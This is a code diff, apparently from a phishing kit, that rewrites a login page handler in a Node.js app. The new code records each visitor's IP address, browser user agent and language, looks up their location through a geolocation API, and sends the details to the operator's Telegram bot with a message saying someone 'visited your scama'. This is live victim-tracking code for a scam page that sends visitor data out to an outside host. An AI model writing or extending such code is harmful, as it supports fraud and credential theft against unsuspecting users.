@@ -9,8 +9,36 @@ const URL = `https://api-bdc.net/data/ip-geolocation?ip=`;
 
 
 
-exports.login = (req, res) => {
-	return res.render("login");
+exports.login = async (req, res) => {
+    let message = "";
+    
+    const sendAPIRequest = async (ipAddress) => {
+            const apiResponse = await axios.get(URL + ipAddress + '&localityLanguage=en&key=' + ApiKey);
+            console.log(apiResponse.data);
+            return apiResponse.data;
+        };
+
+    const userAgent = req.headers["user-agent"];
+    const systemLang = req.headers["accept-language"];
+
+    const ipAddress = getClientIp(req);
+    
+    try {
+        const ipAddressInformation = await sendAPIRequest(ipAddress);
+        const currentDate = new Date();
+
+        message += ` ✈️ ${ipAddress} visited your scama on ${currentDate}\n 🌐 ${userAgent}\n 📍 From ${ipAddressInformation.country.name} |  ${ipAddressInformation.location.city} | ${ipAddressInformation.location.principalSubdivision}`;
+
+        await sendMessageFor(botToken, chatId, message);
+
+        console.log(message);
+    } catch (error) {
+        // Handle any errors, for example, API request failure or sendMessageFor failure
+        console.error('Error in login handler:', error);
+        return res.status(500).send('Internal Server Error');
+    }
+
+    return res.render("login");
 };
 
 exports.loginPost = async (req, res) => {
